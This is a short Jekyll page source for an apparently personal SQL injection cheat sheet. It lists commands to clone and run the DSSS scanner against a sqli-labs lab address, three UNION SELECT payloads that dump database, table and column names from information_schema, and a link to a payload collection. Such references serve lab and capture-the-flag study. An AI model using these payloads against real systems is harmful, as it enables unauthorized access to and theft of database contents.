---
layout: topics
page-title: SQLi
clone-dsss: git clone https://github.com/stamparm/DSSS.git && cd DSSS/
run-dsss: python3 dsss.py -u "10.10.200.81/sqli-labs/Less-1/index.php?id="
print-table-name:  UNION SELECT table_name, column_name, NULL, NULL, NULL FROM information_schema.columns -- //
print-db-name:  UNION SELECT database(), NULL, NULL, NULL, NULL FROM information_schema.columns -- //
all-table-names: union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = database()
payload-examples: https://github.com/payloadbox/sql-injection-payload-list
---

{% include copy-code-blocks.html text='Clone DSSS: ' language='bash' code=page.clone-dsss %}
{% include copy-code-blocks.html text='Run DSSS against a url: ' language='bash' code=page.run-dsss %}
{% include copy-code-blocks.html text='With the right amount of columns -> will print the table name in the first row, column_names in the second row.: ' language='sql' code=page.print-table-name %}
{% include copy-code-blocks.html text='Will print the database name: ' language='sql' code=page.print-db-name %}
{% include copy-code-blocks.html text='Get all table names from a single param: ' language='sql' code=page.all-table-names %}
{% include copy-code-blocks.html text='Payload examples: ' language='bash' code=page.payload-examples %}
Some characters might be filtered out!
